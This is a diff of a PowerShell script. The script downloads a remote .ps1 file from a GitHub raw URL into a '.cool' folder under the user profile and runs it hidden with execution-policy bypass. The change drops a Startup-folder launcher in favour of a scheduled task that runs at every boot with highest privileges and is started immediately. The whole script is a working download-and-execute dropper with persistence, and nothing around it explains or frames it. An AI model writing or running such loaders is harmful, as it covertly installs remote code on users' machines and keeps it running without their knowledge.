@@ -1,16 +1,17 @@
 $url = "https://raw.githubusercontent.com/Dannesch/test/main/code.ps1"
-$path = $Env:APPDATA + "\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd"
 $directory = $Env:USERPROFILE + "\.cool\"
 if (-not (Test-Path -Path $directory -PathType Container)){
     New-Item -Path $directory -ItemType Directory
 }
 $file = $directory + "cool.ps1"
 
-$content = 'PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 2>&1
-PowerShell -W Hidden -Exec Bypass %USERPROFILE%\.cool\cool.ps1 >> "%TEMP%\StartupLog.txt" 2>&1'
-
 $file_content = Invoke-WebRequest -Uri $url
 $file_content | Add-Content -Path $file
-$content | Add-Content -Path $path
 
-powershell.exe -W Hidden -Exec Bypass $file
+$task = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-W Hidden -Exec Bypass %USERPROFILE%\.cool\cool.ps1'
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -RunLevel Highest
+
+Register-ScheduledTask -Principal $principal -Trigger $trigger -Action $task -TaskName "cool"
+
+Start-ScheduledTask -TaskName "cool"
